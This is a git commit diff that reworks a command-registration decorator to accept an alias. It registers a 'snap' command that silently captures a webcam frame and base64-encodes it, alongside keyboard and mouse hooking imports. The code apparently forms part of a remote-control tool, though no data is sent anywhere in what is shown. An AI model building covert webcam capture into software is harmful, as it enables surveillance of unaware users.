2caac5fd0489847ffab44d4d12f4460b17fd90a4
sick-codes <jamesdorn790@gmail.com>
2021-05-30 12:48:36 -0700

    adde alias prameter to register decorator

--- main.py
+++ main.py
@@ -7,26 +7,27 @@ import pynput
 import win32gui
 from optparse import OptionParser
 import inspect
-import prts
 
 commands = {}
 
 
-def Register(func):
-    if func.__name__ not in commands:
-        print("registered", func.__name__)
-        commands[func.__name__] = {
-            'func_ref':func,
-            'args': inspect.signature(func)
-        }
-    return func
+def Register(alias):
+    def inner(func):
+        if func.__name__ not in commands:
+            print("registered", func.__name__)
+            commands[alias] = {
+                'func_ref':func,
+                'args': inspect.signature(func)
+            }
+        return func
+    return inner
 
 
 class main:
     def __init__(self):
         self.__commands = {}
 
-    @Register
+    @Register(alias="snap")
     def snapshot(self):
         i, img = cv2.VideoCapture(0).read()
         return base64.b64encode(img)
@@ -47,3 +48,4 @@ class main:
         
 
 
+print(commands)
